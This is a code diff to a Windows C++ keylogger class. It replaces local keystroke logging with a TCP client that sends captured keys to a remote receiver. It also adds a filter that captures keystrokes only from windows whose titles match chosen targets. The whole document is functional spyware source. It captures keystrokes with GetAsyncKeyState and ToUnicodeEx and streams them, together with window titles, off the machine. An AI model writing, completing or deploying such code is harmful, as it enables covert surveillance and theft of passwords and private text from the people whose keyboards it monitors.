@@ -16,12 +16,13 @@ const std::vector<std::wstring> Keylogger::specialKeysNames = { L"{LMB}", L"{BSP
 																L"{RCTRL}",L"{LALT}",L"{RALT}",L"{CAPS}",L"{ESC}",L"{DEL}",L"{LEFT}",L"{UP}",
 																L"{RIGHT}",L"{DOWN}" };
 
-Keylogger::Keylogger(Logger* logger) {
-	this->logger = logger;
+Keylogger::Keylogger(TcpClient* client, Filter* filter) {
+	this->filter = filter;
+	this->client = client;
 }
 
 Keylogger::~Keylogger() {
-	delete this->logger;
+	delete this->filter;
 }
 
 
@@ -30,19 +31,23 @@ void Keylogger::logKeys() {
 	BYTE states[256];
 	if (!GetKeyboardState(states))
 		return;
-	HKL lang = GetKeyboardLayout(GetWindowThreadProcessId(hWindow, NULL));
-
+	HKL lang = GetKeyboardLayout(GetWindowThreadProcessId(hWindow, NULL));	
+	bool isWorthy = false;
 	for (unsigned int i = 0; i < trackedKeys.size(); i++) {
 		for (unsigned int j = 0; j < trackedKeys[i].size(); j++) {
-			if (GetAsyncKeyState(trackedKeys[i][j]) & 0x0001) { // key was pressed
-						
-				
+			if (GetAsyncKeyState(trackedKeys[i][j]) & 0x0001) { // key was pressed										
 				if (hWindow != hLastTrackedWindow || titleUpdateRequest) {
 					wchar_t windowTitle[255];
 					GetWindowTextW(hWindow, windowTitle, 255);
 					if (std::wstring(windowTitle) != this->windowTitle) {
+						if (filter->Check(std::wstring(windowTitle))) {
+							isWorthy = true;
+							client->Send(L"\n[" + this->windowTitle + L"]\n\t");
+						}
+							
+						else
+							isWorthy = false;
 						this->windowTitle = std::wstring(windowTitle);
-						logger->Append(L"\n[" + this->windowTitle + L"]\n\t");
 					}
 					titleUpdateRequest = false;
 					hLastTrackedWindow = hWindow;
@@ -57,10 +62,12 @@ void Keylogger::logKeys() {
 				case 2:
 					wchar_t wcharBuf[2];
 					ToUnicodeEx(trackedKeys[i][j], scanCode, states, wcharBuf, 2, 0, lang);
-					logger->Append(wcharBuf[0]);					
+					if (isWorthy)
+						client->Send(wcharBuf[0]);
 					break;
 				case 1:
-					logger->Append(this->specialKeysNames[j]);
+					if (isWorthy)
+						client->Send(this->specialKeysNames[j]);
 					titleUpdateRequest = true;
 					break;
 				}
